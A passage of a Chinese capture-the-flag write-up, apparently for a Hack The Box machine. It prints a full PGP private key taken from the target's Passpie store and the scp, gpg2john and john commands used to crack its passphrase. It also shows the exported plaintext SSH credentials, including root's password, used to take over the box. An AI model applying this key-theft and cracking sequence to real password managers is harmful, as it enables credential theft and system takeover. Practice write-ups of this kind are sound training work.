FU9d04WCssSi9J5/BiYiRwFqhMRXqvHg9tqUyKLnsq8mwn0Scc5SVYh4BBgRCAAg
FiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4V9YCGwwACgkQOHd1w1dF0gOm5gD9
GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

不知道能不能破解，搜了下 `john passpie` 看看，像是用john能破解。  
> <https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html>

先把文件下到本地。  
然后尝试john。不过报错说文件只需要私钥，那就整理一下再继续：
```bash
$ scp -r jnelson@10.10.11.186:/home/jnelson/.passpie .


$ sudo sh -c 'gpg2john .keys > gpghash'
[sudo] kali 的密码：
Created directory: /root/.john

File .keys
Error: Ensure that the input file .keys contains a single private key only.
Error: No hash was generated for .keys, ensure that the input file contains a single private key only.


$ sudo sh -c 'tail -n 45 .keys > privKey.pgp'

$ sudo sh -c ' gpg2john privKey.pgp > pgp.hash'

$ john pgp.hash
...
Proceeding with wordlist:/usr/share/john/password.lst
blink182         (Passpie) 
```

OK！  
再到目标机试试 `export`：
```bash
jnelson@meta2:~$ passpie export pass
Passphrase: 
jnelson@meta2:~$ cat pass 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

拿到root的SSH密码~

## flag: root

```bash
jnelson@meta2:~$ su -
Password: 
root@meta2:~# cat 
.bash_history  .bashrc        .local/        .profile       restore/       root.txt       
root@meta2:~# cat root.txt
6b757…………1658172
```


---

## 总结·后记

2022/12/22  
因为准备考CEH，上完课觉得以前的学习太过理论了，于是想着以实践复习一下，顺便冲一下Rank。  
至此，终于打完了5台Esay（Photobomb的WP没写），再打一台Medium就要脱离Script Kiddie，走向Hacker啦~

这台也是这段时间活跃的5台Easy里用户评价最难的一台。  
不过有了前几台的经验，似乎稍微领悟到一点套路，于是WP的格式也逐渐改善，最后定下一个大体上的[WP模板](./../active/writeup-template.md)。  
一是方便今后写WP，另一个是提醒自己把握渗透流程，时刻都要明白自己处于哪个阶段、目的是什么。
